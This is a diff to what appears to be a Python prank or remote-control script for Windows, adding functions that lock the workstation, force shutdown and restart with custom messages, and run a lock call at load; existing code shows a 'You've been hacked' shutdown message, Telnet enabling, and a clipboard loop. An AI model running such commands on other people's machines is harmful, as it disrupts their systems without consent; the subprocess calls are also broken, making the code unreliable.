@@ -10,6 +10,24 @@ def locksystem():
     msg = "rundll32.exe user32.dll, LockWorkStation"
     runrun(msg)
 
+def simplelock():
+    try:
+        obj, _ = subprocess.run("rundll32.exe user32.dll, LockWorkStation", check=True, shell=True)
+        # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
+    except Exception as e:
+        print("This failed to execute : " + str(e))
+
+def osShutdown():
+    os.system("shutdown /s /t 60")
+
+
+def restartshell():
+    try:
+        obj, _ = subprocess.run('shutdown /r /t 60 /c "This is a custom message for the Restart Procedure"', check=True, shell=True)
+        # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
+    except Exception as e:
+        print("This failed to execute : " + str(e))
+
 
 def shutdown():
     msg = "shutdown /s"
@@ -17,7 +35,7 @@ def shutdown():
 
 
 def shutdownmessage():
-    msg = "shutdown /s /e 'You've been hacked '"
+    msg = "shutdown /s /t 30 /c 'You've been hacked '"
     runrun(msg)
 
 
@@ -114,13 +132,14 @@ def runprocess(msg):
         print("C")
         # self.client.send(output.encode("utf-8"))
 
+
 def runrun(msg):
     obj = "failed"
     try:
         obj, _ = subprocess.run(msg, check=True, shell=True)
         #output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
     except Exception as e:
-        print("This failed too (runrun) : " + str(e) + " + " + str(obj))
+        print("There may have been an error: " + str(e) + " + " + str(obj))
 
 def MSGBOX():
 
@@ -139,7 +158,10 @@ def ctypesmsgbox():
 def enableTN():
     msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
     runrun(msg)
+#input()
+#osShutdown()
 input()
+simplelock()
 #TN()
 #enableTN()
 
@@ -179,5 +201,3 @@ def clipboard():
 for i in range(10):
     clipboard()
     time.sleep(5)
-
-passwordpasswordpassword
